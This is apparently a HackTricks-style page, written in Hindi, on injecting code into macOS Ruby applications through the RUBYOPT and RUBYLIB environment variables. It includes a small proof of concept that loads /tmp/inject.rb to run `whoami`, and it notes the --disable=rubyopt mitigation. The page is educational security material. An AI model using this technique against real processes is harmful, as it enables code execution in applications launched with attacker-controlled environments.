# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby script चलाने से पहले `RUBYOPT` environment variable से supported command-line switches को parse करता है। Ruby, `RUBYOPT` में `-e` के माध्यम से code execution को अस्वीकार करता है, लेकिन `-I` किसी library-search directory को prepend कर सकता है और `-r` किसी library को require कर सकता है। इसलिए, जो process attacker-controlled environment variables के साथ Ruby लॉन्च करता है, उसे attacker-controlled Ruby code load करने के लिए मजबूर किया जा सकता है।<sup>[[1]](#references)</sup>

`/tmp/inject.rb` बनाएं:
```ruby:inject.rb
puts `whoami`
```
एक सुरक्षित Ruby script बनाएँ, जैसे `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
इसे नियंत्रित `RUBYOPT` मान के साथ चलाएँ:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
इस behavior को disable करने के लिए, script name से **पहले** `--disable=rubyopt` (या `--disable-rubyopt`) पास करें:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` के बाद लिखा गया option script को `ARGV` में पास किया जाता है; यह Ruby द्वारा `RUBYOPT` की पहले की processing को disable नहीं करता।<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

`RUBYOPT` के अंदर `-I` के साथ load directory को prepend करने के बजाय, अलग `RUBYLIB` environment variable Ruby के `$LOAD_PATH` में directories जोड़ता है। `RUBYOPT=-r<module>` के साथ मिलकर, यह `RUBYOPT` में `-I` की आवश्यकता के बिना attacker code को load करता है:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
